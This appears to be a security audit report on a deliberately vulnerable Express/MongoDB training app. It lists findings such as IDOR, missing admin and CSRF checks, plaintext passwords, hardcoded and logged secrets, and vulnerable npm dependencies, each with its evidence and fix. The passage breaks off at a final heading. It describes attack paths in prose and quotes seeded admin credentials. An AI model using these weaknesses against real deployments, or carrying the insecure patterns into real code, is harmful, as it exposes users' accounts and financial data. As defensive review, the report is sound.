title: Allocations route trusts a user id taken from the URL instead of the session
evidence: The middleware chain in front of this route is only [isLoggedIn] (app/routes/index.js:24, sessionHandler.isLoggedInMiddleware) which checks req.session.userId is truthy and nothing else. The handler at app/routes/allocations.js:16-18 reads `const { userId } = req.params;` -- the id from the URL, not `req.session.userId` -- and passes it straight to `allocationsDAO.getByUserIdAndThreshold(userId, threshold, ...)` at line 23 with no ownership check. The correct source is even commented out immediately above at allocations.js:12-15 ('Fix for A4 Insecure DOR - take user id from session instead of from URL param'). Any authenticated user can therefore GET /allocations/<any other userId> and read another user's stock/fund/bond allocation.
impact: Any logged-in user can enumerate and read every other user's financial allocation data by walking the :userId path parameter; no ownership check exists anywhere on this route.
fix: Take the id from req.session.userId (as the commented-out code already shows) instead of req.params.userId, or verify req.params.userId === req.session.userId before querying.

title: POST /benefits changes any user's benefit date with no admin-role check
evidence: The chain in front of this route is only [isLoggedIn]; the isAdmin middleware (sessionHandler.isAdminUserMiddleware, app/routes/session.js:25-34, exported as isAdmin at index.js:27) exists and is wired up nowhere except a commented-out alternative registration immediately below at index.js:57-60 ('Fix for A7 - checks user role to implement Function Level Access Control ... app.post("/benefits", isLoggedIn, isAdmin, benefitsHandler.updateBenefits);'). The live handler, app/routes/benefits.js:29-54, takes `userId` straight from req.body and calls `benefitsDAO.updateBenefits(userId, benefitStartDate, ...)` with no role check and no check that userId belongs to the caller.
impact: Any authenticated non-admin user can POST an arbitrary userId and benefitStartDate to change any other employee's benefits record; the feature is admin-only by design (see the commented-out isAdmin fix) but enforced nowhere at runtime.
fix: Add the existing isAdmin middleware to this route: app.post("/benefits", isLoggedIn, isAdmin, benefitsHandler.updateBenefits).

title: GET /benefits discloses every user's record, including plaintext passwords, with no admin-role check
evidence: Same chain gap as the POST route: only isLoggedIn runs, isAdmin is defined (app/routes/session.js:25-34) but commented out for this route at index.js:57-60. The handler, app/routes/benefits.js:13-27, calls `benefitsDAO.getAllNonAdminUsers` (app/data/benefits-dao.js:15-21), which does `usersCol.find({ isAdmin: { $ne: true } }).toArray(...)` and returns the full stored documents -- and app/data/user-dao.js:17-31 shows the user document stores the plaintext password in the `password` field (bcrypt hashing is commented out). Those documents are passed into the `users` template variable at benefits.js:19-25 and rendered.
impact: Any authenticated user, including one who just self-registered via /signup, can GET /benefits and receive every non-admin user's stored document -- name, email and plaintext password -- letting them log in as any other user in the system.
fix: Add the isAdmin middleware to this route, and stop returning the password field from getAllNonAdminUsers / the benefits view regardless.

title: Login does not regenerate the session id after authenticating
evidence: This is the entire post-authentication state change in handleLoginRequest (app/routes/session.js:53-119): after userDAO.validateLogin succeeds, the code sets req.session.userId directly on the pre-existing session with no call to req.session.regenerate() -- the comment immediately above (lines 104-115) describes exactly this fix and says it is not applied here. This is not a framework-default assumption: the sibling handleSignup function in the same file calls `req.session.regenerate(() => { req.session.userId = user._id; ... })` at session.js:234-243, so the regenerate call is available and used elsewhere but skipped specifically on the login path.
impact: An attacker who fixes a victim's pre-login session id (e.g. by getting them to open a link that sets the session cookie) inherits an authenticated session once the victim logs in, without needing to know the victim's credentials.
fix: Wrap the post-login state change in req.session.regenerate(), the same way handleSignup already does at session.js:234.

title: State-changing profile update has no CSRF token anywhere in its chain
evidence: The chain in front of this route is only [isLoggedIn], which checks req.session.userId and nothing about the request's origin. I read the whole of server.js: the csurf require is commented out (server.js:7, `// const csrf = require('csurf');`) and the only app.use(csrf()) call in the file is inside a block comment (server.js:104-113); csurf is never mounted at all -- not mounted-late, simply absent from every request the app serves. handleProfileUpdate (app/routes/profile.js:40-107) changes ssn, dob, address, bankAcc and bankRouting for req.session.userId using only the ambient session cookie, with no token comparison anywhere in the function.
impact: A page on another origin can auto-submit a form to POST /profile using the victim's browser-held session cookie and change their bank account/routing number and SSN on file, since nothing but the cookie is required.
fix: Uncomment and mount csurf() before the routes in server.js, and render req.csrfToken() into the profile form so handleProfileUpdate can verify it.

title: Login password check uses a non-constant-time string comparison
evidence: comparePassword (user-dao.js:60-67), called from validateLogin (user-dao.js:57-94, invoked by the POST /login handler at session.js:58), compares the stored and submitted passwords with strict equality, which short-circuits on the first differing byte. The library already in use, bcrypt-nodejs (required at line 1), ships bcrypt.compareSync, and the commented-out line directly below (user-dao.js:63-66) shows that fix was written and then disabled in favor of the plain `===` comparison.
impact: The comparison's execution time leaks information about how many leading characters of a guess match the stored value, in principle helping an attacker narrow a guess faster than pure brute force; this is compounded by the password being stored in plaintext (user-dao.js:17-31) rather than hashed.
fix: Restore bcrypt.compareSync(fromUser, storedHash) (after also fixing password storage to hash on signup) instead of comparing raw strings with ===.

title: Login endpoint has no rate limiting or lockout in its middleware chain
evidence: This route's entire middleware chain is the bare handler -- no per-route limiter is registered here, and I grepped the whole app tree (app/, config/, server.js) for rate-limit/express-brute/lockout/attempts patterns: the only hits are prose in app/views/tutorial/a2.html describing the fix as a tutorial topic, not code. server.js's global middleware stack (favicon, bodyParser, session, static) also contains no limiter before routes(app, db) is called at server.js:132. validateLogin itself (user-dao.js:57-94) performs one unthrottled DB lookup and comparison per call.
impact: An attacker can submit unlimited login attempts against any username with no delay, lockout or CAPTCHA, making online credential stuffing and password guessing practical against every account.
fix: Add a per-account (not just per-IP) rate limiter or progressive lockout in front of handleLoginRequest, e.g. express-rate-limit or express-brute keyed on the submitted userName.

title: Session cookie is configured with no absolute expiration
evidence: This is the complete live express-session configuration; the only cookie block that would set maxAge is commented out immediately below at server.js:92-100 ('Fix for A3 - XSS ... TODO: Add "maxAge" ... cookie: { httpOnly: true ... }'), so no maxAge is ever passed and resave:true keeps re-extending the store's own default lifetime on every request. req.session.destroy() is called correctly on logout (session.js:122), so this is specifically an absolute-expiration gap, not a logout gap.
impact: A session, once created, has no server-imposed absolute lifetime; a stolen or leaked session id (e.g. via XSS or a synced device) remains valid indefinitely as long as the app keeps touching it, rather than expiring after a bounded window.
fix: Set an explicit cookie.maxAge (and consider a separate absolute-expiry timestamp checked server-side) in the session() options.

title: Session-signing secret is a hardcoded literal committed to the repository
evidence: config/config.js:7-10 merges config/env/all.js with the per-environment file for NODE_ENV; config/env/production.js is `module.exports = {};` (empty), so this literal is the value used in production too, with no override anywhere. server.js:17 destructures cookieSecret from config and passes it straight into express-session's secret option at server.js:82 (`secret: cookieSecret,`), which is the HMAC key used to sign the session-id cookie.
impact: Anyone with the source (this is a public repository) can compute a valid signature for any session id, including one carrying an arbitrary userId, and present it as a cookie to authenticate as any user -- including an admin -- without credentials.
fix: Read the secret from an environment variable / secret manager, generate it randomly per deployment, and rotate the committed value.

title: Session cookie is never marked Secure and the server only ever listens on plain HTTP
evidence: The live session() options object (server.js:78-85) has no `cookie` key at all -- the one that would set `secure: true` is inside the block comment at server.js:92-100. semgrep's javascript.express.security.audit.express-cookie-settings.express-cookie-session-no-secure rule independently flags this same line for the same reason. I read the rest of server.js and confirmed the server is started with `http.createServer(app).listen(...)` at server.js:145-147, and the https.createServer alternative that would load artifacts/cert/server.key is entirely commented out (server.js:18-28, 149-155), so even if `secure` were set the app has no live path that serves over TLS. express-session's documented default for `cookie.secure` is `false` when unset, which I take from its published API rather than an installed copy inspected in this tree, hence `likely` rather than `confirmed`.
impact: The session cookie carrying req.session.userId is eligible to be sent over an unencrypted channel; on a network path with any intermediary (proxy, shared Wi-Fi, misconfigured load balancer) it can be captured and replayed to hijack the victim's session.
fix: Set cookie.secure: true (behind an HTTPS-terminating proxy or a real TLS listener) and actually serve over HTTPS instead of the plain http.createServer call.

title: User passwords are stored in the database as plaintext
evidence: app/routes/session.js:220 calls userDAO.addUser(userName, firstName, lastName, password, email, ...) with the raw password field from req.body (session.js:54-57). addUser builds the Mongo document at user-dao.js:20-31 and assigns the incoming `password` parameter to the `password` field verbatim at line 25; the bcrypt hashing call that would replace it (`password: bcrypt.hashSync(password, bcrypt.genSaltSync())`) is present only as a comment at lines 26-30 and never executes. validateLogin's comparePassword helper at lines 60-61 does `fromDB === fromUser`, a direct string comparison, which only works if the stored value is the literal password - confirming the DB genuinely holds it in cleartext, not a hash.
impact: Anyone who can read the `users` collection - via a database backup, a NoSQL-injection foothold (the app already builds unsanitized $where queries in app/data/allocations-dao.js), or an insider with DB access - recovers every user's real login password in plaintext, including the admin account, enabling immediate account takeover and credential-stuffing against other services where the same password is reused.
fix: Hash passwords with bcrypt (or argon2id) before insert: `password: bcrypt.hashSync(password, bcrypt.genSaltSync(12))`, and compare with `bcrypt.compareSync(password, user.password)` in validateLogin instead of `===`.

title: SSN, date of birth, and bank account/routing numbers are stored unencrypted
evidence: app/routes/profile.js:82-91 passes ssn, dob, bankAcc and bankRouting straight from req.body (destructured at profile.js:42-50) into ProfileDAO.updateUser. Inside updateUser, bankAcc and bankRouting are assigned unmodified at profile-dao.js:55-59, and ssn/dob at lines 61-66, then written to Mongo via `users.update({_id: ...}, {$set: user}, ...)` at lines 78-91. The encryption helper (AES via crypto.createCipheriv, PBKDF2-derived key) that would protect these fields is present at lines 15-40 and the corresponding encrypt() calls at lines 67-76, but the entire block is commented out, so no encryption ever runs. getByUserId (lines 94-110) likewise returns the raw stored value with its decrypt() call commented out at lines 100-105.
impact: Anyone with read access to the `users` collection - a DB backup, an admin, or an attacker who reaches the database through another flaw - obtains every user's social security number, date of birth, bank account number and routing number in plaintext, enabling identity theft and financial fraud.
fix: Encrypt ssn, dob, bankAcc and bankRouting at rest with an authenticated cipher (AES-GCM) using a per-record random IV and a key from a KMS/secrets manager, or use MongoDB field-level/client-side encryption; decrypt only when displaying to the owning user.

title: The entire application is served over plain HTTP, with TLS support present but disabled
evidence: server.js requires only `http` (line 12) and starts the server with `http.createServer(app).listen(port, ...)` at line 145. An `https` block that loads artifacts/cert/server.key and artifacts/cert/server.crt and calls `https.createServer(httpsOptions, app).listen(...)` exists at lines 18-28 and 149-155 but is entirely commented out, so it never runs. Every route reachable through this server - login (app/routes/session.js, posting the password), profile update (app/routes/profile.js, posting ssn/dob/bankAcc/bankRouting) - is therefore served in cleartext.
impact: Any attacker positioned on the network path between the client and the server (shared Wi-Fi, a compromised router, an ISP) can read or modify login credentials, session cookies, and the SSN/bank data submitted through the profile form in transit, with no active interaction from the victim beyond normal use of the site.
fix: Uncomment the HTTPS block (lines 18-28, 149-155), serve exclusively over `https.createServer`, redirect any HTTP request to HTTPS, and set `cookie: { secure: true }` on the session middleware.

owasp: A09:2021 Security Logging and Monitoring Failures
title: The session cookie secret and crypto key are printed to the console on every application start
evidence: config.js builds `config` by merging config/env/all.js (which defines `cookieSecret: "session_cookie_secret_key_here"` at all.js:8 and `cryptoKey: "a_secure_key_for_crypto_here"` at all.js:9) with the environment-specific file at line 10, then unconditionally dumps the whole merged object with `util.inspect(config, false, null)` at line 13 - `false` disables depth-limiting so every nested key, including the two secrets, is fully expanded in the printed string. This module runs on every server boot (server.js:17 requires `./config/config` before anything else), so the secret is written to stdout/container logs on every start, in every environment including production.js.
impact: Anyone with access to the process's stdout - container logs, a log aggregator (this app ships a Procfile for Heroku-style deployment), or a CI build log - obtains `cookieSecret`, letting them forge a valid express-session cookie for any user including the admin, and `cryptoKey`, the key intended for encrypting sensitive fields.
fix: Remove the unconditional config dump, or redact secret-shaped keys (cookieSecret, cryptoKey) before logging, e.g. log an allowlist of non-secret fields only.

owasp: A09:2021 Security Logging and Monitoring Failures
title: The database seed script logs every seeded user record, including its plaintext password, to the console
evidence: USERS_TO_INSERT (lines 12-37) hardcodes the admin and two test accounts with plaintext `password` fields (e.g. `"password": "Admin_123"` at line 18; the bcrypt hash that would replace it is commented out at line 19). Line 99 serializes each of those objects with JSON.stringify and prints it with console.log before insertion, so the plaintext password for the admin and every seeded user is written to stdout. docker-compose.yml:9 runs `node artifacts/db-reset.js` as part of the container's startup command, so this logging happens on every container start in the Docker deployment, not only in a one-off local script.
impact: Anyone with access to the container/build logs recovers valid plaintext credentials for the admin account (`admin` / `Admin_123`) and the two seeded user accounts, sufficient to log in directly.
fix: Do not log the full user object; log only the userName, or drop the log line entirely once the seed is verified to have inserted the expected number of documents.

title: Unhandled exceptions render the raw error object to the client, unescaped
evidence: app/routes/error.js is mounted as the last middleware (app/routes/index.js:82) and receives every `next(err)` call from the route handlers (e.g. session.js:100, profile.js:21/93, benefits.js:17/37, contributions and allocations handlers), most of which forward raw MongoDB driver errors unmodified. errorHandler passes the whole `err` object to the view at error.js:10-12 (`res.render("error-template", { error: err })`) with no filtering of the message. error-template.html:11 interpolates it directly with `{{error}}`, and swig's global autoescape is turned off in server.js:137 (`autoescape: false`), so whatever `err.toString()`/`err.message` contains - including internal MongoDB error text - reaches the HTTP response body unescaped.
impact: An attacker who triggers any unhandled error (a malformed request, a duplicate-key conflict, a downstream driver error) receives internal implementation detail in the response - and, because it is rendered unescaped, any error message built from attacker input becomes a reflected-XSS vector on top of the information disclosure.
fix: Render a generic, static error page to the client and keep the detailed message only in the server-side console.error/console.error(err.stack) calls already present at error.js:7-8.

title: bcrypt-nodejs (the password-hashing library) is deprecated and has never been updated beyond its first release
evidence: package.json pins bcrypt-nodejs to the exact version 0.0.3; package-lock.json resolves node_modules/bcrypt-nodejs to that same 0.0.3 and itself carries the registry's own deprecated field: "bcrypt-nodejs is no longer actively maintained. Please use bcrypt or bcryptjs." `npm view bcrypt-nodejs version` still returns 0.0.3 today -- no later release was ever published, so there is no newer version to move to within the package. app/data/user-dao.js line 1 does `require("bcrypt-nodejs")` and uses it to hash every stored user password. npm audit reports no open CVE against it, so this is a maintenance finding, not an active-exploit finding.
impact: The password-hashing library the whole authentication scheme depends on will receive no further fixes; it is a pure-JavaScript bcrypt reimplementation, not the audited native binding, and any weakness found in it in the future has no upstream to patch it.
fix: Replace bcrypt-nodejs with the actively maintained `bcrypt` (native binding) or `bcryptjs` package and update the require in app/data/user-dao.js.

title: body-parser 1.18.3 is vulnerable to two denial-of-service advisories and pulls a vulnerable qs
evidence: package.json declares body-parser at ^1.15.1; package-lock.json resolves node_modules/body-parser to 1.18.3. `npm audit --json` run against this lockfile reports body-parser as vulnerable at range <=1.20.5 via two direct advisories: GHSA-qwcr-r2fm-qrc7 ("denial of service when url encoding is enabled", high, fixed in 1.20.3) and GHSA-v422-hmwv-36x6 ("invalid limit value silently disables size enforcement", low, fixed in 1.20.6). body-parser also depends on qs, itself flagged for 8 further advisories (prototype-pollution protection bypass GHSA-hrpp-h998-j3pp, event-loop DoS GHSA-f9cm-p3w6-xvr3, and others) at the resolved qs version. This package parses every incoming request body for the Express app in server.js, so the DoS is on the request path.
impact: An attacker can send a crafted request body that exhausts server resources before any route handler validation runs, taking the application down for all users.
fix: Upgrade body-parser to >=1.20.6 (npm audit reports a fix is available without a major bump); this also pulls a patched qs.

title: csurf is deprecated/archived and depends on a cookie version with an input-validation advisory
evidence: package.json declares csurf ^1.8.3; the lockfile resolves node_modules/csurf to 1.9.0. npm audit flags csurf (range >=1.3.0) via its transitive cookie dependency, GHSA-pxg6-pf52-xh8x ("cookie accepts cookie name, path, and domain with out of bounds characters", low, fixed in cookie 0.7.0). Separately, `npm view csurf deprecated` returns the maintainers' own notice: "This package is archived and no longer maintained." There is no newer csurf release (latest on the registry is 1.11.0, still tracking the old cookie range) that resolves this cleanly.
impact: The CSRF-token middleware used across the app's forms depends on a cookie parser that can accept out-of-spec characters in cookie attributes; combined with the package itself being unmaintained, no future cookie-parsing issue in this dependency chain will be fixed by upstream.
fix: Pin an `overrides`/`resolutions` entry to force cookie >=0.7.0, and plan a migration off csurf (archived) to a maintained CSRF middleware such as `csrf-csrf` or Express's own double-submit-cookie pattern.

title: Express 4.16.4 carries an open-redirect advisory, a reflected-XSS advisory, and 6 further transitive advisories
evidence: package.json declares express ^4.13.4; the lockfile resolves node_modules/express to 4.16.4. npm audit reports express (range <=4.21.2) with two advisories on express itself: GHSA-rv95-896h-c2vc ("Express.js Open Redirect in malformed URLs", moderate, fixed <4.19.2) and GHSA-qw6h-vgh9-j6wx ("express vulnerable to XSS via response.redirect()", low, fixed <4.20.0). The same audit run lists express as the direct dependency pulling in 6 further vulnerable transitive packages -- body-parser, cookie, path-to-regexp, qs, send, serve-static -- each with its own advisories (path-to-regexp ReDoS GHSA-rhx6-c78j-4q9w, serve-static/send XSS via template injection GHSA-cm22-4g7w-348p and GHSA-m6fv-jmcg-4jfg among them). body-parser's own advisories are reported as a separate finding.
impact: A malformed URL reaching res.redirect() (or a raw path-to-regexp route) can send a victim to an attacker-controlled destination or reflect script back into the response; the transitive chain adds a further set of DoS and template-injection vectors on the same request path.
fix: Upgrade express past 4.21.2 (or to the current 5.x line); npm audit reports a fix is available in this repository's lockfile constraints.

title: express-session 1.15.6 depends on vulnerable cookie and on-headers packages
evidence: package.json declares express-session ^1.13.0; the lockfile resolves node_modules/express-session to 1.15.6. npm audit reports express-session (range 1.0.1-1.18.1) as vulnerable through two transitive packages: cookie, GHSA-pxg6-pf52-xh8x (out-of-bounds cookie attribute characters, low) and on-headers, GHSA-76c9-3jph-rj3q ("on-headers is vulnerable to http response header manipulation", low, fixed <1.1.0). express-session is the package that issues and reads the application's authenticated session cookie (configured in server.js).
impact: A crafted cookie attribute or a response passing through on-headers could let an attacker inject or manipulate response headers on the session-cookie path, a low-severity but directly session-adjacent issue.
fix: Upgrade express-session; npm audit reports a non-major fix is available that resolves the cookie and on-headers ranges.

title: forever 2.0.0 pulls a chain (flatiron -> nconf -> optimist -> minimist) with critical prototype-pollution advisories
evidence: package.json declares forever ^2.0.0 as a production dependency (not a devDependency); the lockfile resolves node_modules/forever to 2.0.0. npm audit's aggregate severity for forever is "critical", driven by a chain it depends on: flatiron -> broadway -> nconf (GHSA-6xwr-q98w-rvg7, prototype pollution, high) -> optimist -> minimist (GHSA-xvch-5gv4-984h, prototype pollution, critical). A second branch, forever-monitor -> chokidar -> anymatch -> micromatch -> braces, adds a ReDoS advisory (GHSA-grv7-fg5c-xmjg). I read the audit chain but did not trace forever's own code to confirm which of these libraries parses attacker-reachable input versus only local CLI/config arguments at process-start time, which is why this is `likely` rather than `confirmed`.
impact: If any of the vulnerable parsers in this chain (nconf/optimist/minimist) is reachable from data forever handles at runtime rather than only from local startup configuration, an attacker could pollute Object.prototype and change application behavior; forever is used here to run/restart the server process rather than to handle web requests directly, which likely limits, but does not eliminate, remote reachability.
fix: Upgrade forever to 4.0.3 (a major-version fix per npm audit) or replace it with a maintained process manager (pm2, systemd) since forever's own upstream has been mostly dormant.

title: helmet 2.3.0 is three major versions behind and pulls a ReDoS-flagged debug and a CSP config-override bug
evidence: package.json declares helmet ^2.0.0; the lockfile resolves node_modules/helmet to 2.3.0 (current helmet major is 8.x). npm audit reports helmet (range 0.3.0-3.20.1) via two transitive packages: connect -> debug, GHSA-9vvw-cc9w-f27h ("debug Inefficient Regular Expression Complexity", high, fixed <2.6.9), and helmet-csp, GHSA-c3m8-x3cg-qm2c ("Configuration Override in helmet-csp", moderate, fixed <2.9.1). This is the middleware that sets the app's security headers in server.js.
impact: A crafted debug-log input could trigger catastrophic backtracking (DoS) in this dependency of the security-header middleware, and the CSP configuration-override bug could let an attacker weaken the Content-Security-Policy the app believes it is sending.
fix: Upgrade helmet to a current major version (helmet no longer bundles helmet-csp or the vulnerable debug/connect chain in its modern releases); npm audit reports a fix is available.

title: marked 0.3.5 has six known advisories including two sanitization-bypass/XSS issues and two ReDoS issues
evidence: package.json pins marked to the exact version 0.3.5, and the lockfile confirms node_modules/marked resolves to 0.3.5. npm audit (range <=4.0.9) lists six direct advisories against marked at or below this version: GHSA-7px7-7xjx-hxm8 (XSS from data URIs, moderate, fixed <0.3.7), GHSA-vfvf-mqq8-rwqc (sanitization bypass via HTML entities, moderate, fixed <0.3.6), GHSA-p9wx-2529-fp83 (ReDoS, moderate, fixed <0.3.17), GHSA-x5pg-88wf-qq4p (ReDoS, high, fixed <0.3.9), and two further inefficient-regex advisories fixed only at 4.0.10 (GHSA-rrrm-qjm4-v8hf, GHSA-5v2h-r2cx-5xgj). marked converts markdown to HTML for this app's memo/research pages.
impact: Markdown containing a crafted data URI or entity sequence can bypass marked's own sanitization and render as executable script in a victim's browser, and several of the same inputs can hang the renderer via catastrophic backtracking.
fix: Upgrade marked to at least 0.3.19 for the pre-4.x advisories, or to the current major, and re-verify any output is still passed through the app's own HTML sanitization before being written to the page.

title: mongodb driver 2.2.36 has a direct DoS advisory and a critical deserialization advisory in its bundled bson
evidence: package.json declares mongodb ^2.1.18; the lockfile resolves node_modules/mongodb to 2.2.36. npm audit (range <=3.1.12) reports GHSA-mh5c-679w-hh4r ("Denial of Service in mongodb", high, fixed <3.1.13) directly on the driver, and a further critical advisory on its bundled mongodb-core -> bson dependency: GHSA-v8w9-2789-6hhr ("Deserialization of Untrusted Data in bson", critical, fixed <1.1.4). This driver is required by every *-dao.js file in app/data/ and is the layer through which all application data flows to MongoDB.
impact: A crafted document or query response reaching the vulnerable bson deserializer can crash the process or, per the advisory's classification, lead to unsafe deserialization; the current driver is over 40 minor releases and two major versions behind the maintained 7.x line, which has dropped this bson path entirely.
fix: Upgrade the mongodb driver (npm audit's suggested fix is the current major, 7.6.0); this is a breaking change to the driver API and will require touching every DAO file, so plan it as a scoped migration rather than a patch bump.

title: needle is pinned to an exact 2018 release, four major versions behind current
evidence: package.json pins needle to the exact version 2.2.4, published 2018-09-22 per the registry's own `time` metadata; the lockfile confirms node_modules/needle resolves to 2.2.4. The current needle release is 3.5.0 (published 2026-03-12). `npm audit --json` against this lockfile reports no open advisory for needle at this version, so this is not a vulnerability finding, only an outdated-and-pinned-exact finding: the caret is absent, so `npm install` will never move this forward even for patch releases.
impact: needle makes outbound HTTP requests on the app's behalf; being four majors behind means any security fix needle has shipped since 2018 (TLS defaults, redirect handling, header injection hardening) is not present, and the exact pin means nobody will notice a fix is available without deliberately checking.
fix: Remove the exact pin in favor of a caret range and upgrade to the current needle major, re-testing any code that depends on its specific response-handling behavior.

title: node-esapi, the security-encoding library, has had exactly one release and it is 11+ years old
evidence: package.json pins node-esapi to 0.0.1; the lockfile confirms node_modules/node-esapi resolves to 0.0.1. The registry's own version-time metadata for node-esapi shows a single published version, 0.0.1, created 2014-01-31, with no release since. npm audit reports no open advisory, because this package has effectively no maintainer activity for a vulnerability database to track against. node-esapi is a port of OWASP's ESAPI encoder, i.e. it is specifically depended on here for output-encoding/XSS-prevention helpers.
impact: The library this app may lean on for encoding untrusted output has not been touched since 2014 and tracks no upstream OWASP ESAPI changes since; any gap in its encoding coverage found today has no path to a fix.
fix: Replace node-esapi with a maintained output-encoding library appropriate to the templating engine in use (e.g. the `he` or `lodash.escape` packages for HTML-entity encoding, or the templating engine's own auto-escaping).

title: swig 1.4.2 has an unpatched arbitrary local file read advisory and is marked no-longer-maintained
evidence: package.json declares swig ^1.4.2; the lockfile resolves node_modules/swig to 1.4.2, the last version ever published. npm audit reports GHSA-2rq5-699j-x7p6 ("Arbitrary local file read vulnerability during template rendering", high, range <=1.4.2) directly against swig, with `fixAvailable: false` -- npm audit itself confirms there is no patched release to move to. `npm view swig deprecated` returns "This package is no longer maintained." swig also pulls optimist -> minimist (GHSA-xvch-5gv4-984h, critical prototype pollution) and uglify-js (GHSA-c9f4-xj24-8jqx, ReDoS, high). swig is the templating engine wired up via consolidate for this app's views.
impact: The unpatched file-read advisory means a template-rendering path that includes attacker-influenced input could be used to read arbitrary files on the server, and there is no version of swig this app could upgrade to that fixes it.
fix: Migrate off swig entirely (it is archived); consolidate, which this app also depends on, supports several actively maintained template engines (e.g. EJS, Nunjucks) as drop-in replacements.

title: underscore 1.9.1 is within the range vulnerable to CVE-2021-23358 (arbitrary code execution via template())
evidence: package.json declares underscore ^1.8.3; the lockfile resolves node_modules/underscore to 1.9.1. npm audit reports GHSA-cf4h-3jhx-xvhq ("Arbitrary Code Execution in underscore", critical, range >=1.3.2 <1.12.1) -- 1.9.1 falls inside this range -- and a second advisory, GHSA-qpx9-hpmf-5gmw ("unlimited recursion in _.flatten and _.isEqual", high, range <=1.13.7, still open in the latest 1.13.8 per the advisory's own range). The current published underscore is 1.13.8, one patch above the declared floor of this app's caret range.
impact: GHSA-cf4h-3jhx-xvhq lets an attacker who controls a value passed into underscore's `template()` function execute arbitrary JavaScript on the server; whether this app reaches that function with attacker-controlled input was not traced as part of this dependency-only review, so treat this as a confirmed vulnerable dependency with impact conditional on a call-site the code-review departments should check.
fix: Upgrade underscore to >=1.12.1 at minimum (fixes the code-execution advisory) and ideally to the current 1.13.8.

title: async 2.6.1 (devDependency) is vulnerable to prototype pollution
evidence: package.json declares async ^2.0.0-rc.4 as a devDependency; the lockfile resolves node_modules/async to 2.6.1. npm audit reports GHSA-fwr7-v2mv-hh25 ("Prototype Pollution in async", high, range >=2.0.0 <2.6.4) directly against this exact resolved version. async is a build/test-time dependency only (not in the `dependencies` block), so this does not ship in the running application; the risk is to whatever consumes untrusted data during development, testing or CI runs of this repository.
impact: If a build or test script feeds external/untrusted JSON through this async version's affected functions, an attacker who controls that input could pollute Object.prototype for the duration of the dev/CI process.
fix: Upgrade async to >=2.6.4 (a non-major bump per npm audit / the advisory's fixed range).

title: cypress 3.3.1 (devDependency) is 13+ major versions behind and carries a very large transitive advisory chain
evidence: package.json declares cypress ^3.3.1; the lockfile resolves node_modules/cypress to 3.3.1 (current cypress major is 16.x). npm audit's aggregate entry for cypress carries no direct advisory on cypress itself but reaches, through its dependency tree, at least 8 further vulnerable packages with their own advisories: debug (ReDoS, GHSA-9vvw-cc9w-f27h), extract-zip (symlink path traversal, GHSA-jmr9-qjv8-65gv / GHSA-7pqw-9j4j-h8q3), lodash (multiple, incl. critical prototype pollution GHSA-jf85-cpcp-j695 and code injection via `_.template`, GHSA-r5fr-rjxr-66jc), moment (path traversal, GHSA-8hfj-j24r-96c4), and the fully-deprecated `request` package's own chain (critical form-data unsafe-random advisory GHSA-fjxv-7rqg-78g4, SSRF GHSA-p8p7-x288-28g6). I counted these from the audit output but did not trace which of cypress's own code paths actually invoke the vulnerable functions, hence `likely`.
impact: cypress is a devDependency (test runner), so this is a supply-chain/CI risk rather than a production-request risk: a compromised transitive package here would run with the privileges of whoever runs `npm test`/CI, not with the privileges of the deployed app.
fix: Upgrade cypress to a current major version; this is a large breaking change (test syntax has changed significantly since 3.x) and should be scoped as its own migration.

title: grunt 1.0.3 (devDependency, and the project's own `npm test`/precommit runner) has three direct advisories
evidence: package.json declares grunt ^1.0.3; the lockfile resolves node_modules/grunt to 1.0.3. npm audit reports three direct advisories against grunt at this version: GHSA-m5pj-vjjf-4m3h ("Arbitrary Code Execution in grunt", high, fixed <1.3.0), GHSA-rm36-94g8-835r ("Race Condition in Grunt", high, fixed <1.5.3), and GHSA-j383-35pm-c5h4 ("Path Traversal in Grunt", moderate, fixed <1.5.2). It also pulls grunt-legacy-util -> getobject with a critical prototype-pollution advisory (GHSA-957j-59c2-j692) and a js-yaml chain with 6 further advisories including code injection (GHSA-8j8c-7jfh-h6hx). This is the same `grunt` invoked by this repo's own `npm test`, `precommit`, and `db:seed` scripts (package.json scripts block), so it runs routinely, including in CI (.travis.yml, .github/workflows).
impact: A malicious Gruntfile task, plugin, or crafted YAML config processed by this exact grunt/js-yaml combination could achieve code execution in whatever environment runs `npm test` or the precommit hook, including CI runners.
fix: Upgrade grunt to >=1.6.1 or later (npm audit reports a fix is available) to close the three direct advisories; the getobject and js-yaml transitive fixes generally come along with a current grunt-cli/grunt-legacy-util pairing.

title: jshint 2.12.0 (devDependency) pulls a ReDoS-flagged minimatch and shelljs; the same chain is duplicated via grunt-contrib-jshint and grunt-if
evidence: package.json pins jshint to the exact version 2.12.0; the lockfile confirms node_modules/jshint resolves to 2.12.0. npm audit reports jshint as vulnerable through minimatch (5 ReDoS advisories, e.g. GHSA-hxm2-r34f-qmc5, high, fixed <3.0.2) and shelljs (GHSA-4rq4-32rv-6wp6, "Improper Privilege Management", high, fixed <0.8.5). package.json separately declares grunt-contrib-jshint (^3.0.0, line 48) and grunt-if (a GitHub-tarball dependency, line 51), both of which npm audit flags for the identical jshint->minimatch/shelljs chain rather than a distinct advisory, so they are noted here rather than filed as separate findings.
impact: jshint (and the grunt tasks that wrap it) run as part of this repo's own linting/precommit workflow; a crafted filename or lint-config string reaching the vulnerable minimatch pattern-matcher could hang the lint process (DoS to the dev/CI workflow), not the deployed application.
fix: Upgrade jshint's minimatch and shelljs (npm audit reports fixAvailable: false for the jshint entry itself, meaning a manual override/resolutions entry, or a move to a maintained linter such as ESLint, is needed).

title: mocha 2.5.3 (devDependency) pulls growl, which has a critical command-injection advisory
evidence: package.json declares mocha ^2.4.5; the lockfile resolves node_modules/mocha to 2.5.3 (current mocha major is 12.x). npm audit reports mocha's growl dependency with GHSA-qh2h-chj9-jffq ("Growl before 1.10.0 vulnerable to Command Injection", critical, fixed <1.10.0), plus further advisories via debug (ReDoS), diff, glob->minimatch (ReDoS), and mkdirp->minimist (critical prototype pollution). I did not verify whether this app's own test suite invokes mocha's growl desktop-notification path (it typically triggers only when a local `--growl` flag is used interactively), which is why this is `likely` rather than `confirmed`.
impact: If growl's notification path is reached with a value an attacker influences (e.g. a test/spec name pulled from untrusted input), it could result in command execution on whatever machine runs the test suite; absent that flag, the exposure is limited to the other, lower-severity advisories in this chain.
fix: Upgrade mocha to a current major version; growl is optional and, if it is not needed, can also be excluded/overridden directly.

title: nodemon 1.19.1 (devDependency) pulls a ReDoS-flagged chokidar/braces chain and an outdated update-notifier
